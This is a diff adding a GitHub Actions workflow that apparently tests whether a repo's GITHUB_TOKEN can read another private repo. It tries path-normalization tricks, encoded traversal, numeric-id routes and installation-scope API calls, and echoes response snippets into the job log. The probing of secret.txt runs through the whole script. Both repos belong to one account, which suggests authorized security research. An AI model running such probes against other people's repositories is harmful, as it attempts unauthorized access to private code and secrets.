@@ -1,0 +1,39 @@
+name: pathnorm-probe
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    steps:
+      - name: GITHUB_TOKEN cross-repo path-normalization / id-route probe
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          set +e
+          probe() {
+            code=$(curl -s -o /tmp/b -w '%{http_code}' -H "Authorization: Bearer $GH_TOKEN" -H 'Accept: application/vnd.github+json' "https://api.github.com$1")
+            echo "PROBE $1 -> $code $(head -c 80 /tmp/b | tr -d '\n')"
+          }
+          # control: own repo
+          probe "/repos/pwnhaven-afk/rig-lock"
+          # target: private repo, plain and normalized forms
+          probe "/repos/pwnhaven-afk/rig-secret"
+          probe "/repos/pwnhaven-afk/rig-secret/contents/secret.txt"
+          probe "/repos/pwnhaven-afk/rig-secret/./contents/secret.txt"
+          probe "/repos//pwnhaven-afk/rig-secret/contents/secret.txt"
+          probe "/repos/pwnhaven-afk/rig-secret/contents/../contents/secret.txt"
+          probe "/repos/pwnhaven-afk/rig-secret/contents/%2e%2e/secret.txt"
+          probe "/repos/pwnhaven-afk%2Frig-secret/contents/secret.txt"
+          probe "/repos/pwnhaven-afk/rig-secret/contents/secret.txt/"
+          probe "/repos/pwnhaven-afk/rig-secret//contents/secret.txt"
+          # numeric-id routes (repo id of rig-secret)
+          probe "/repositories/1467785537"
+          probe "/repositories/1467785537/contents/secret.txt"
+          probe "/repositories/1467785537/actions/artifacts"
+          # pull-style routes
+          probe "/repos/pwnhaven-afk/rig-secret/pulls"
+          probe "/repos/pwnhaven-afk/rig-secret/git/refs"
+          # installation scope
+          probe "/installation/repositories"
